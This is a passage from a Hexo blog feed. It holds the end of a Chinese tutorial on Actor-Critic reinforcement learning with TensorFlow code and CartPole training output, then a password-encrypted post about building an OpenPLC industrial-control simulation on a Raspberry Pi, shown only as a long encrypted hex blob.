tf.train.AdamOptimizer(lr).minimize(-self.expV) # min(expV) = max(-expV)    def learn(self, s, a, td): # 学习        s = s[np.newaxis, :]        feed_dict = {self.s: s, self.a: a, self.tdError: td}        _, expV = self.sess.run([self.trainOp, self.expV], feed_dict)        return expV    def chooseAction(self, s): # 选择行为        s = s[np.newaxis, :]        probs = self.sess.run(self.actsProb, {self.s: s})        return np.random.choice(np.arange(probs.shape[1]), p=probs.ravel())class Critic(object):    def __init__(self, sess, nFeatures, lr=0.01):        self.sess = sess        self.s = tf.placeholder(tf.float32, [1, nFeatures], &#39;state&#39;) # 输入1：当前状态        self.v_ = tf.placeholder(tf.float32, [1, 1], &#39;vNext&#39;) # 输入2：下一个奖励折现值        self.r = tf.placeholder(tf.float32, None, &#39;r&#39;) # 输入3：当前奖励        with tf.variable_scope(&#39;Critic&#39;):            l1 = tf.layers.dense(inputs=self.s, units=20, activation=tf.nn.relu, kernel_initializer=tf.random_normal_initializer(0., .1), bias_initializer=tf.constant_initializer(0.1), name=&#39;l1&#39;) # 第一层            self.v = tf.layers.dense(inputs=l1, units=1, activation=None, kernel_initializer=tf.random_normal_initializer(0., .1), bias_initializer=tf.constant_initializer(0.1), name=&#39;V&#39;) # 第二层        with tf.variable_scope(&#39;squaredTDError&#39;):            self.tdError = self.r + GAMMA * self.v_ - self.v # 时间差分值的平方            self.loss = tf.square(self.tdError) # loss        with tf.variable_scope(&#39;train&#39;):            self.trainOp = tf.train.AdamOptimizer(lr).minimize(self.loss)    def learn(self, s, r, s_): # 学习奖励机制        s, s_ = s[np.newaxis, :], s_[np.newaxis, :]        v_ = self.sess.run(self.v, {self.s: s_})        tdError, _ = self.sess.run([self.tdError, self.trainOp], {self.s: s, self.v_: v_, self.r: r})        return tdError # 返回给Actorif __name__ == &#39;__main__&#39;:    env = gym.make(&#39;CartPole-v0&#39;)    env.seed(1)    env = env.unwrapped    N_F = env.observation_space.shape[0]    N_A = env.action_space.n    sess = tf.Session()    actor = Actor(sess, nFeatures=N_F, nActions=N_A, lr=LR_A)    critic = Critic(sess, nFeatures=N_F, lr=LR_C)    sess.run(tf.global_variables_initializer())    if OUTPUT_GRAPH:        tf.summary.FileWriter(&#39;log/&#39;, sess.graph)    for episode in range(MAX_EPISODE):        s = env.reset()        t = 0        trackR = []        while True:            if RENDER:                env.render()            a = actor.chooseAction(s) # 获取动作            s_, r, isDone, info = env.step(a) # 执行动作            if isDone:                r = -20            trackR.append(r) # 保存奖励值            tdError = critic.learn(s, r, s_) # Critic学习奖励值            actor.learn(s, a, tdError) # Actor根据tdError更新状态            s = s_            t += 1            if isDone or t &gt;= MAX_EP_STEPS:                episodeRsSum = sum(trackR)                if &#39;runningReward&#39; not in globals():                    runningReward = episodeRsSum                else:                    runningReward = runningReward * 0.95 + episodeRsSum * 0.05 # 更新此轮奖励                if runningReward &gt; DISPLAY_REWARD_THRESHOLD:                    RENDER = True                print(&#39;[+] episode: {}, reward: {}&#39;.format(episode, runningReward))                break</code></pre><p>Actor-Critic 涉及到了两个神经网络，而且每次都是在连续状态中更新参数，每次参数更新前后都存在相关性，会导致神经网络只能片面的看待问题，甚至导致神经网络学不到东西。所以这里学习的速度不是很快，而且起伏较大，很难收敛：</p><pre><code class="bash">$ ./Actor-Critic.py...[+] episode: 0, reward: -7.0[+] episode: 1, reward: -6.8[+] episode: 2, reward: -6.01[+] episode: 3, reward: -6.059499999999999[+] episode: 4, reward: -6.156524999999999[+] episode: 5, reward: -6.1486987499999985[+] episode: 6, reward: -6.0912638124999985[+] episode: 7, reward: -6.336700621874998[+] episode: 8, reward: -6.569865590781248...[+] episode: 169, reward: 153.89380890618554[+] episode: 170, reward: 152.09911846087627[+] episode: 171, reward: 151.84416253783243[+] episode: 172, reward: 160.05195441094082[+] episode: 173, reward: 202.04935669039378</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>浙江大学信电学院《机器学习》课程<br><a href="http://karpathy.github.io/2016/05/31/rl/?_utm_source=1-2-2" target="_blank" rel="noopener">Deep Reinforcement Learning: Pong from Pixels</a><br><a href="https://mofanpy.com/tutorials/machine-learning/reinforcement-learning/" target="_blank" rel="noopener">Reiforcement Learning - 莫烦 Python</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ml</tag>
      
      <tag>rl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Raspberry Pi搭建OpenPLC模拟小型工控系统</title>
    <link href="/2020/07/19/Raspberry-Pi%E6%90%AD%E5%BB%BAOpenPLC%E6%A8%A1%E6%8B%9F%E5%B0%8F%E5%9E%8B%E5%B7%A5%E6%8E%A7%E7%B3%BB%E7%BB%9F/"/>
    <url>/2020/07/19/Raspberry-Pi%E6%90%AD%E5%BB%BAOpenPLC%E6%A8%A1%E6%8B%9F%E5%B0%8F%E5%9E%8B%E5%B7%A5%E6%8E%A7%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password." data-whm="Wrong hash.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Need password...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="db8be89a270a0ccb943e9cfd33a14815733ab081c357a67d3283a1672d0a5c06">a8e6f10f7a8336f7c06218f908b93f1c854218a316a57c3d8dd765023a20368aaa49ddeabc369173048b39cced0faa696f4fd812c58a01f3b1a5d9e50cb24e3b4e2ef409e89536ef26e52d3bc47d7275e76f609d05ebb132c0b02f99bd6a6cdfb00f26d5c308bff7a80ce786107a2c9d0ac643a9dc6a9dbe046441c14b0bf48550dff82780d5940c839ba164df5257ad9282d5282d5c96e91862021c162955376096839a6ccf2676dc905030f69d2e489fc0871b872dc5ce708377ce2035fcec46f46cceb4e82be9fd468e4b6af46eb65d4d2e150bbabf61e7a6500c4b92e22b94b97851aa75c8cea20a7957b00fdd8d6104b7926796176e873554a0814509a99ae000756733b8bafca283a273037e5fe2274ffc07caa15bbc27d41ed5191b209b5599824c78c7c5e7fed501919aa0b8499ceac870756bd11689b3026d2008e37266f3bb997270b53ad658a8ece642b9fce2fb568d6426bfaa16076df020341de46a4fb583fd0d90dacadb6459ab2454638f4f0f0b09e47fd77eaf9bc812e78e6543f7b07024faaa6fea0e51135e95e4036b19b737793c3001ffa034849666222315c582d8fb602a25eb9cdf81e78ff70e8339b2d4974da7eabe234f5e36652ce85e76fedc0f9c8d7edc5053f30f7cc73cb5ffcf2823adf9b55b2f0dec37a8c2f8c5b348779c06a28d405047585c24aa46baacf2eb557badfb42800567d1d538023da0cbff09ffa2487866ccfe3f4d0ccbab8ff3b40d2ba378e9bfc3935d544e2fed2897e57f4139ee282bcfc888d6bbc2e05718d8d753543de0078d45180075efd442b7bd8272ca2e133f5129c8bcafa9c0c8f3ce9dc147bce00bb664eb1e8e9580b9e5ec485bcda87c568960ae41fec0b7601539fffff8868fb2b3ce2a8bfe08f87930c15d6cdce59a35fa3f1d315a4fdbed2db2329c2b972228f8f4d7f09de47bf2062334e43c8b8db271a283c9629faedf9bace0d163664a5b561ccc251ddd242a6e602c886dbce07389c5b7fc56325a3f4583f653bcf5f86e50934b03121dc2899a9efda45f87dcd68441ba65066e13ffe9e121731a7041c9a3a1ee19647a5d62507b3dc69ba3f7d8148c37aa672321a33ea0c51a7219ad6022d62b6c88680577d16a78c72250b669bd35940dd60f3968c4cceca415e5bd7dd7a0cba31f6f7d01def8a6ffd54678eb29d9237ddcc8a836b67e5d3d3e7b4c43706217a0e58736b9bb5e24c24b05d9ebb89a22c3ad7a7a9179089c6e038c3dbaed59c5a60c29ec0f1a1f1a048e71bdd8b02eb14dd167f60e511ed21952904d04b8f8a397197785a6f266fa479d0325ae4d4642b88c56fba6a18e3d07d06e82f3fc7a863c6f921fcf022dd87c32817eba98a79af065f72a446d4912f332ab374cacd26c8cb084ae92ba1faaf6f2a4d7fde822673970d4696ed972a1351d241e0e23a7901d11354450ec17280720d2e3416c6b381e16bffc9cdcaa54d377c357906a292ea3d45dcd5242fbb734835b0e02dd5ccc1605d94dc3580271b6bf4ffbfefc978ac6bd446482b1dd8437a882d453cecaaa4a9e45ad4499184e2dfdb747e1519765f9d29dcbe103782cbadd848d863a93300b836451cc0c13814bab3a685ac32e84d1e28327c0a081b8413c57fcd2fa1fc62d3091dd1fc8e9f8ea245357878b64e5be7890bf609692533e551e6a8f35fe6f4a0438bcdfecd3506824ee2426f09e4c11320ae78c3eaa434c9412b7d0e911305e9ce6e63e141eba3be1b1fefbb5e05a1f5ca520b431b9a2d9b3becc652c343589a44f926efd0101f12df722c727b829f67531bbbaaaf6eb5e417fdc75fea6292a151591a3fd3bc8fd6554ad276a4ab8a425418134d7b73a1c4d905dda9e7e45d2630b4a17b06cf06964909416dd1facb9b0749336d7b61502fcde24d429b2489cd4c844a97c79a63b0ea0197c0cff5e8e47dfea7ff5a59b1687d77ae7977be2e67bda8cee9f6d81c756d5acb8201e7aa1503da0b40dd7e2e12b0c147361ba6150dde0a6facfdee64b001b57e1476167a7058e5f6fd3fa043bef4755d2c312b7ebdda90d17114b537eb144a67e88a3d60676f49988bfd6862f4ca993d5f5caa83e5e5c0950618091799daf2e9db79e2c24e4f5a639ab0c1bfc5bf4eccc916f797cfdc54040a38310a929238cad19dd6d2efa1793aadaec6abfcae60a6fc98d0326246c0d144883e4c5ab61550f62ba8bb5a7e9f8948e6ace7fcbd5bbe3214232e01d651ffaf4afde143cfdbe882e516201b5272c36316a2090c99c37ee82746483245d7ecede8e66cb8830a5f3e07536a3ad16a97a847ef6d46d86e4ad6b2a49d0daa86c79463c2f4355bec347596edc16f20750d8f4df24185b0cf242e3e636912a55f8c69f7810ef90384935d24bfcbc8ee817732807fbb50d21a801b6daeb01cef5cfd3076346355275fe009bcb74852459d9fc632fd1a78deb24346f1b165a2dc4250899581bf250c36cb37e847ae674d9dd9da20c77d335bb9b1fa46f57746c6d8271816bb6540c17bfa71d306cff653ad8735e3ee9373f833011764c1a3b9cb120794aa3316917b27b3387b6c73a29b3781f8fc1e9f6ae22c76bd6aa4601d4a5d38180d0a94b702428d66a827b18b7cbd1a1fd90477144ef880a4f4efa2eb2b19dc57b9aee3fd3b88b466a58c79ae095cdb74f2581add09481d5a7310eeac642662fdee86e6ba731f717f040b8f89fbf706f8c3da0971dccc7a7096f293c213cd7eca875445ab5f2e1c89cec79b1eab3f3525ed318354831aa4f21df24db142dcb0dd0cee7e135e1d215fc9fe18719799861f927f493a9ef3bd28b4b27cb17dd451096c4e43d1258564eb921fd79f803977db9dd1f02524defaf0c9eef1690318559c0b3b608ffffe1cf8bfc1dd3f7814833a3c15e07854136982e045c4789979423a6a2aea61050b67017104709abe1dbf7fcb7b8616280a8146051d99cfb3c896e5d3171a580a7a1c2a0d0e3ba8d21bc66b9bdab31a52277e4f992da8dce3e709f615aab7de173f69d848c772cee31e7550cc56e86b9644bf8b92d1ae786f613eb854bb593d20254b15d75469ce1889e1a60eb644127c68dfcac99e2fc240fe7a2177c799f89031ffc019b92fa4012caa80b5d6bd0d03decce866e368713a7c15f6d7f8a152adaa92c6c087dee0ee2322a555d40c20875310f7cf91b9e128c18750c1cb1a201278cd24b8cd4c5f5e304b423fa41eae0e58803c34e84e2283303bb984adf78ea128f2b75eb9a80fff167cf745d1474913f3c748b1dc966c0c85a81d2f9ae7bcd083a6cba26138383572e6d5a4a90338c6eedb14ba8f9d037624ce885d248ff92fa89767bad06bcb1dc25c69a54951651037bc556b3e32aea6344525a123a59ed2b3079631aae968ed78a4402614114f173621599233a8968bb3e70780e96b42a05ef79832ede217ab70f48a9e2d3c57c22ebd71046efb6d7853b3e7bf62b9d0e49314652f9ec71fbc8a06dfaf97c0fa082a8e77f11222b543c886e4ecb5c0e110231f6de7c9bccde0b1e1ce9091ce0be2055d35962401d1f78a53db4a157dfa4f042210b48789ca2f2e6833608980b576b795305423628463c50f575a12c237d8bcaaf99292544c84a2cd19f56feffc94448c7d645043c66c65d5cb76407d73fedb359cbeab51232ee1f2de701f4c4a1e88727157a509a8fb9bdeeaa709aa0064912fa846282a26d5b00615d37093973347d4a9f50e573895b7aadd2185b9694bbdba290fa3da31c63c1bc04bd05f343850a9acf10683714d18a3ac6d041bee3d5b4e118104111b79c3c7f27f450b434055d5292aa7c082ad71ed2c82c3297e490337f35106cbae3e003544ce901124b7a9bdac95f3dfbe8c6b053ae517db576cad09e7893da1c8cad3a04a1808ee3a45a36f915511c8424b9c3d497b4c9d5740067f06d08508cbd1df7a379fd01d64eaed213a52604afa2ad023ebcf27961953fcf33b73bde122a5fa3239d3ff252ff506cdcf4946c6c5d5111dc17cb0690b1d08ebee79b6625e5e42b2f4473b1e2641d89ec0941d755629d889f8a0ecd5f95f04bdc6b1f926831e00531acc9d686605d81eecba752e348a685771ec111f0fb661f3d71051f3d5f1a03b9f68e9f4582f343a21478be27dfb4a7fc6b361df18db287646ff27514d9d6b8997509683737a994594bb83ff5deae364c71eae2b01cc1bea627c1205b7ed347c34af246b555f7fc798d457bb3eeb52a2dd495a0cc75798621d7534d06747c8a3417fbbb77ad5dbd68c198e91db7d098351de7071b469078a1671f42ed36d9524d09dc96e7f40a7cf9e65f818c2f466fdd98f4e9cbcb83dc265df23297e31d59412e1526a9aea952c1bfdd037d07a753f5122eeff073cf4cc2ee059f5a3c74f2c34852642f86ed4cdb7c3772dcd179383b7842fa1152aa7bc5eb0b8c357d56a1400428fac573fbd14d8dc3c8c4d94e3e408c1ae02576c1ad1e89008ec48fd0d2eaf3bf3957c62e39b2f88774b5d8d66a66045ef485b799e75d7893ba341e117a443c2097fc113d7d9b6372dc2d86b2779f20eb49825c0e18a704b89651458a1f91f38433c4944df69b49ea921e9ee717c90d7605e1839d21c03bf86f09e546c4965901d408894628aebec70fb395b805d68333b4c2f44618f52754a44adc3c2fb9f7ef9deff01d3a242106d95edf737474d7f73655ac5327524a5f24b31f3712cbe5144a906730207391c0cec37ab2d566b60f5b375c16377c9f36f43935bb6f518ce524017244f0b98c08c7e48ef5ba3938ba56730133b1382604b75955273702e323eba19ea605f81ca0969c669af86eb5f364806a0649a59fa98680d0e35c8d7d95e704a0162922b739bb4a10d5e2fd478155c4f83ecec6016b227ddeb6b88c760ac8572b601c288b87436cf9a5c91f4c11e61405931c6514018cebd78076d00c0c4c2d867741fc5943f0ad81849cf75b13c54b7eb31d47b51d914d22039d96a065c9d005c4b1a1a138b79c392af7355d743eca7363f05bfaa0135cd258992523eb2001e1d30d3dbbe643d8218f9599e3b371940d21586f3bc86b3fed51be153af47be1019526cf0f0a2e41732122d5e1ca70cc70284e92ad90eac16188c9cdc54e1e9506178f6c71d68ccc46a103e7cc6414456196853d278e72f010088d81c6aac91f1a205f0830e5cd2c201223c87dc3a3999e77a8f70d9f5b57007cf26e987e095b596376e62231eb383cf25d1b514024ae86dc477bdbfc95e5699e46f9c47f6472836ac02d95b54c074c176910ba12dcce4b733343f5a32c081af78d21cdb5c90130ebff6946275a03893497eb38c39cc912f68f1c4dae4bdf1ab4aad827d5706dc3eb37bde8fd55ba65e21d7cfef104e62ab0cbce3ff85a320f02377562a09698ea2541df58358a34d637abf73c4ed283d644b44d597ec1f9caff52a3fb9071d0278533f3f7fbff4fd45584e940482c9bf70ea6c6d0527ca1d976754ec81e4ffc296ce1ad6fe4f479c0254ff2815e7b8535ddf8e48d19131e929d0c89adc8c488973bcbc5bd6120e4c27e536f461a5875fbcadd3363c0f8f31f70b29184129ed7167df0139787a2c4d93edc4d4ce18bae05cb33ef470766ddfa39fb26488d9a364a52bd2cb1c2967175ac410055bd1ca39977c2e6376cd62a744806d2ec1713fe94cf12ac38c89c4dab2d297084c24d0e700b9f28fc359f5d170fe49feb696c49de2f4e8f801daeb6994e255b9117104034c82ef5da88f6637ca68de8a8564e0330e0d91f7781c3d291e458814ed765294f553558e8db0dd2b5b556fdacb19c90774a3ac65741129222531df1d0b55bfcf081afd05bcfd8028579d11be3396fe1d5578f13f4e3da982979f54d458dbbb7731921c8ed70a292783faa36f62fc1d2db06198145ff731c6b47fff024b9ffb788dd8a0c3ab782ed90824dddce57ce0d30c8634138986cced77b563e191b5ea55389756f7a89c3b3125b11f4b646b7b6b92d15aa961c659c750323bba463d4325e2860f39dffae573e38e1f95ebdfe46bb4b1bbf69476984bc87df751be1b3798244f1ebbc7496f4df14198840f33c939c12b3756f18c5f329720d1b7a059803d0291a53bd92e4078c8e92ecc9e322b5cf7eb149e75ff0c955db05cedf438b4280df6efa0ae5b9e5091d8865c2594938634a92f57ce7348e3f48006c73265ada07bc51fbeb58ca9d51af07887553b74d587cc7cd8d66f8cc1053b7aaf30d156448e2e601d9f31bca85d47335d45a580e28158971f977dda0b9d3c75db57e7366517c55cfcbfc6b4b40edf1e86a64e08693a9fdcca5c6fb10f16b9a4366e213800e4c6b48f7f0f43d0f34fe77f40f467e5fb323d6d7039644044282de12a6ea905bd0b174f3b52dffb996891ca4914faf56c013ce0f2fe5003a48f27274b9c74c221c613a40304aefb4c56d9ddead7a386d7622b4990cba5065820f4f526d4519776c09675555e8564da5729e8f0cf24740205bd119553e6f7933f6488fd69ec727ede2c36ebd9e8910d9f3ee96d49219468b5bcfbb4c9169592564c18a3db3c66069f29c9bb370e938be4816fc38976da39097070bc2f0967572b39d2cbd43250734982f554ddaa1e8e360cc173906356e9d3eba63bc3976bb3e1ebed2ea5cf6983e2a23169635a6d93d20c690862df2f539a1a2b3241e8528521fb7b28ccbd9b9881fa139f48b8a31c5bbea0db6937ce083119d476859deea6ade790162998865bd2c324ce24997172fe963fe554794e5b255dd5bd057571f91fa4f6154c4364c063c202a674f8fe9d7ee14207304a194fb1cc5489619951029c8b5940b7f1dd2769bfa329b0cbd229be8401c8b5ed08b004bbc120a167f5257920c59887511aefe838536a55e6a5d11758071f5c13a56b28fb0f7c501090ca9efcfb4fb21533cd04d048d8745cb549227160de997664b8cce5cbae19906a232973251195cc5ee288b429bb4eb8a771bdd527a67b5e75de08e5a343a2be581213844fdd6467596dd1de8dc57073e1c3692417f239758344b4a63cb94e4599093114a7e1c79611bf8f0de89b669a22290a24f600b2698845b2a0567ea09adb2f32b7a9891700643facceab994bc6e8a560ccf6c37455555d91ca5540c5335df8ac8b4fd3c678659837b667538db51a9570857e4b1d510c2c2cd2d4aaed8d54f3605d11e743f726e27e4aef69c9aee0ceddf4a8f17aff037667cce7a3b5c159800d1b40275f02b9fc08de44e728c3d95d34741ffce939446bc684c3d80ad70365d1ecd6194333302c240dd3b813fc6410d87c42e7ce8a666b2471e5e9a61591abf7e7d82d2b5bfb96d0baad690887ae16ad083d9868e5511d8b6f95c7cdeb8055aa61eb5323a29386bd34a41ff260741235e28b37adfe8d3880f0c235106c0e3d873584f3d488fa080737b1e1b3c10a3528d45979abf2dfb4d04f76b7e34197a6fed61309f10a0a403a90c2948203be05a5e012adb8b91475b48cc3e362cf093f93897cebed62c1e3a40ae4e3087d6fe60c72d8e4ee2a575775ac61e07f47b74e40647253a5ebab80135155f2ff3a5b96d9db2e90db97af4328ac2dda75e30364ccfdcb835747d4a9c4bedb633f8818d4f181908fe732c5008c27b87ed5f05f727585c8e63d4edcfe3a2142a30c0090f6bc9fc4265f5ea12ca747d6c432957ffb0b9c80741638a742f300cdcd9550dbc01db3ab1c47a674e1eec8115b658c4910ff8eb616fcb423354b24cbef5d61c436ee1d62d4aa84461d809d9a09ee7c5c52ae04b1d80d26956fd7e8fa2d1b49df869a6ff9287b7757f14de18d959a5bcf18787526503db32c1eefd5ae9dd371689500c8f7c98d731fa3d6dac9170309a9e2d8e9f1bfaaaf1dc9a4b729a73a5dfc915e3bf1b7b7235b7892ec489377cbee9c7297db81e44fedc69d2fe79503d758de24bb8a8ed6f3014e7b475c13c8310f2cff434a5401b8b4deff7294c0d86fda7683d96d99600ba7e5dc9dd6abd15fdb3cea31dc0ba8f8778e440d5d805affd082513e3e7df3ea5629965b0c3401db336e89910a2362ec3e8fbd7ae393882cfa4a1fcbe884958d4cb05b5323c571cdd92620d140eacd1c4d86b44981945eb10809e219a1519f3908d10c56871eb905e8d251e3bcfc6598c665ddb872b45339c047d7ad834906fdbf98b04eb166bc995ad9dbe725c0fc793d0ee2eccb709bef8eba3d74e09dd2e39359b5f6fddda485d071ef656344df3f2a195ee6175464f8680436491cc0114014d8b3b51802c88db8d6d86725d3865ae3d586cd9f6294d7766fb42e73640653b68f366cdee91c8e118436ed1f305c6bd1d2224eb7947428f6b33cc2f92c8be533261b664285cd4e5e6aba733d01288bea153bcea5b88ff790855465e98f740cd7fc958ef1aefd8ecc7fddf09d0651c7d941245bd73b5203af8419bfaeb6dff7f31e8425ef961491722a005d6206297f2f2bdb1c5d698467d530aada260e776bf7b80a28ec64952cfcc82047e3d7f6cf70d7f32d87fbb57706671daae59b276ce8e68356109bf604947807d20ef82827794f03ee00b8eac58e288cea351893ee361be0f7207144f221684a4fcca2cd2c3d0e1300a38aa87f40afbe20d442ebd345f5d05fc8fc2c0fa49600accea871c52072184e4419f6471a9e79cf169f307492df8ea8462ba245057905899e003dff3998eee5976e47c73706048f770d66334fa65571c0114509c8d1a3f9b3995905dbca446135f06d316dc70db03856d499406b2d3d6eeb0be7d4a2bea325c8a0b13cea4be150df036891ddd6ee53dbdbc347ad3a26dc21a8b3392b11b66f8f0f0f8c860815d033243cc12b70058ab65e9ec8de05abd8019e304d7695092f8c7639380503e761be5fc16428d2535b669cecb6ff459b23199a3bedddcebf7ff917046c74b750cd56a1d255f7d19bbabed32233cc76105527285d832f6b79937d1ddb21849fe4196040b3af767e43c1886820904c534ed4e38271a32750bda52fb6e0c204de84e977832338d32f85f2aa4ba03b661dda930486a16cfcaf89f5a569cf7477268ad5dc28ac4331a7725fea730836d4af7e7ee813772c9921d03692b7f0429cb578fbfec9f0334d59d8508e566b24284c0f5ff335d10739575749aebc69df2c0fb4e5ff7a1d834d95f3227170c1c55baa2ff3ffbc43f675e3b53618145e7c77b0c5f32fb605426b0bc8d1eed35d13fa45bedce63aca4073ffa5c350d760d8aee7a06aae557a9c121756c0771e3a9f11c7e724b3a4c7e40a14da9d2a9b2bb463ffcd669dcf2bf8b56335664a0912a64c1a2fee796b4bdd89875957fdc448adcc2cb62c3943b7a936c0c37d6d4d43e6fc74c140ff77fd60a9c785930ef1a06e01bd5c87fc1bed7271cac62edd96aaae7b2548602d72affc0aa445f2b41f052bf9b873057e66f932e241016c71e1224843edbeeaf5e6aac6d62eb0a9326cc3d0422c2f272299b39ecca5ab7d7987d0805bba24ab3ea5e7151740721f826e7c9f3b06465ffb744dfe0921376df51909c302ab7fe5e38c246c02f8a2100575f67d50fd1830ced832492ec069a0591be466c650db6197a15862611c00c63b93d104f3319d060fea4bf3a906be963031482dd04b865233e8dc13e4b8c180cbac974dab8b2f60820c5992acdfb513e3accd9014ed685b3c151cfd042f98a0501586014473b3108dc1a8c298838208f5d6be42271efa9a047abab9e633f7ed6566c8f96e9c40878fd15fafbc721e7cea3128cfc514115dbc3a4a6dd2d823faa9c05ff54cc95ffa2950f08dfe6e11842073a792710deec6df6aeeb72b214f6d0c32667f2ca3a1ff7721406e110c8afbf96eb9c19c9d71ac92d28bf1840ebbd5a354b89f77bbe35e804b3c5dc00a158ffcb3e175ae0e577da7dc360e2e3770053e2a86c864202426c28c9697e9c467474c2127ebfb7d0e05d5ffc5475aaf0bc1ac3eb2661c5bfd8a7c225daa974b4cdb4819d0eea69224a3ef0451149c46b22f9ff5cddd7bf6d03cd53b9c7971d36f3b55f6730b8d80b990da3fe835bc9f6d0bdafc3eda81bdcb94a68aa321cbba4df22196f49560612666dc43f646423430a9042fb3e65361a349a1c35cd816e16d3d92bea942946d860c356b570fef34d3646756f2bbd70019e0573dfe7091e306bf24223b0db05237d097eb092cbec5e0cd583bc163734ccfa793a560569a0f3a7759f043a2e7f91effd739ff000ac0f277694cee30f66c6fa2d2cdc25121e3baa9c6b975d930e70d0c392c669e4a49ff4361049c370f7416ef93dc6b401585c4bedc8c1db97db3e7ccbff6f49435c3b29adca7d76c11d4758b16a04619e45482d3b711ad2eacc408a84d99df78a87dc44756df4131c793999f83a1735541643f413d7a854d7cc661e6a9edc338dd12cc02195338f58963f053bb1d78b64ebf8a7ff2cf2693bfed52f79a07033df87a6c8674db291975970731ead33694de7c1271a664dde49a229cc97ecb503c45e367c1e5029aeabf8f7ecc223c98311c156fbe332374cce534baee8d39dcacaa59432cbd23df2f1374a42383d1040d89a9c3693583d0d7956bf4853bf97cd803b93f99896b9b4ab2fb07545a3efe993c6ce3d08e4f588483be7b5c8879c54228eb572a5ff7e60bea4f41f8bbb1efb5dd0b11c444dcbfda0c32f6cfffc0f4655fa99ba513ab71b80959098b796153ef7554c81f3c275b2af65747b4c99e4cdd6284a956b81889f89800b19c01d0071d38ba4c2ce177e93cf288f9a2c52b9be66b5cdf51ddd052be2e300d76d87870668b4912591bcab8c9f440f95c2aaa1ac99e6219aae7492c80e0c29a90ce476a3e286d6a2fb6c1d678f93c1878983a596dfc0e9e661e92614c55307da618e54d53da5c49b0d837fac766e238868b8c950cc354a7cc0d5c9e8447978a04bfadef7f0779dba99f8cb373baf10b5d71dec89407534886aaa15f668feb6060dbd06b4c461064e38cec6646311867910c0d94f5e864faae82e45ba8ab76c068b57a0c1296ae245d2b6458d0af8221374ae083627210124b119ddcb5621835b93d85d0ffb673dc4d46841569d2d06624eeb33723aaab1d137e13759c9f25d888eb24518c22bba309490b2da7a3f2edcbd11e5fe4550bba567949fd5cd9ff960c9b253e8ece69495627493180e0f2da9943cf62adf469b900f163975e07b53578aafa84c618240ec7e931ec48c2ca33c5337ca291859b4470f74abd76c8f914c74d98f41b02f552aa17d87deeceac7306a07e18445aff8d6ef7b1f128a3cb99b1b461fe44d7cb667dadd530a7bc620835be4402f5e05d37ddf132681313cb0291cc701cf20bfe37af77c99c929de743952808bf5b264d4a0f4e14b6bb86c3ef208118455e508f6af80179acef34b1658e0909e255ef6c7f6f06a1ceb307bcf5bdb07da5613108f839e7c851885679e9c9133d09d8f1badc7f78d422a192fd92e4adfaf9833432d5e97f0b71dac2ca405b506fc908dfc15abe219df5a5202a9663650a3d0c82febdef30c4df5a0ca2837b76c238f6cc58b49774e9f8858ca67cc69d2c5429148180c00b322e75c91c324853dd57336851c55b36c6b0698a990760e41e125e529fd31f49f3ec94bbfbd77bfba91ec56ea50fbc4502e2793950f15c270bd877d8bd0f5428b66eafdc27bb446b27fb1e2adf49a464a9332d8dcbe91707a8510c17442ceb9168df127a20cefaa253cc0e66f6032023c413cd6307bbf3c27dae5c605b1618520281802414418a32c0e2611d77f98d38a9d7722764a470cc94b3687f6b264a7b82293a9eceee4eecc534e83d8e835238f5598dac96bd40e428c2d00f0e689e0d90ea63e40858a64519374140df571bb7a22a780e5bf865834d5e4fd23a1a7b0186d8f071c3833365b9af6c98d64ee7f11462794bf186435e6adab3e757de86cb0b13ca49c8edc42ffaeb66e782989a1588eafbb95b1d9b2e83950942a0d572657c0a0defdb57c6fb5313405bc25977b7e628bdf1564ac6172d820e98030a115825b3580c8f171b88edd3e4db970b386be71299560d6566f3fc08507c706a2904df4845c4c9cc82de8ebcf89b0c4215ac681d6a069641f3089d3703570212f8077c781ba37926800320f6854bb4c95444edc43317c7284f5bf98525a25bdc6681612ae58825f4013c7f6a224888bc38e47c92a6d847ae8196b5fef3ab4c6bc0257e132442e659daf86aef384e2774fcef6464fa4d37f52dc7c0130e9e7e8922edb7e3057e514e70b36ae751b38169103dbc83eb0cf7e03ac212339de50802179c5574879d3ba1dd80083cc3a77db6744b63652f8b21274f4969295dd041ee0f840d216bd2ba75de74f18fb5b4d86abae2a625d7e6197ad3034ef3b87aa3b028fbddfd20cc63b745c95d8032f1b01a6b9b58b78a5792cca75a57739aefa91db7453a3854d0e16178fbcce8ee0bf936cbe5944fccb8abc9dd8f49b8696785093c5ee0b186355401079991cc7401f1902a0bef3bd169d8546f27cc16844ac16dc0663d0f50072b701463d10de6b00b193f8eb0f17e37ca4616d5ed497a7f448b39c679b6ff0ec914248fc69ad972b28a27bc469df74deb8d7c8f480b8b25c566b6066c563c871d9c5c4ce891409ee7a87b6e315497d1b20e9d17166530b21005c7ca7c739b3e90f027514cd2ef965a033fa058be15abee4319e47a28ea729fd6cf236e6d3ef48709152753bb1bad76579a701810083e6bd01588d6505bc4569d27eff6fd438805f6186a0e66d360eada0fcf6a6895ef7a0381b6fb23adae3838a763730dd4694bbd28c0840828a8d11f6462cf14ac1803f5f3378a6bc6bec01a71bc61dff4366c44462ec416ee45a499ad71832405c5280f5458dde353b17bd2dfe0d8adddf63071acabc190cf1df53ad112a5dd52def422089f6b22d587536a43d8e999df702f3b686093dbe2e9caf9c64d2e0f1d6028f2a197c4749306a64c6387d42dfbc2bf7093a0769fa3ee3b1ec9679db8e62dbfef0309bb66692160c184098dc5a234e5076902e1645d31a68c0b8ad2c6dc262d54d53dc4e254f10690bef06f0fd363fde2294f34009b69b9ba89d78ceba1387be99df61b1dd93769f9bb823e86d4b6ad511de705b06009d883cfc6f561a027b17de4372aacc4641c727807655b69ce143c9b5daa284e44ce27031f606155d389d7dfd3587deeb19d9d5a232f018fd8f6e8849a98fed0c5e21d78ade1ceb22015a575b57f600f426dd2cb313d68a3545f570f4a97af27a739b6437be93afe85f5212364f124190ba7d33c7a3b4ae5def0466e1ce06d85e44297b314fd3cea8b65f049bfa5f58efcaa2c3e080a7b2b5c0a2c8c5d8c8d48391e604000c70983a7afe9a125df3d6d9f40d479bfe32d1b31b425ebd53a8a40c5f86f9d1e4b05390753ae31d37b56c0abd572c7772d9475abc449b775ba2639558a90de66e9e87a3164a60dc14f4037a18ae17309af6b75b71ad524e8d4f3a953efbad782b9d40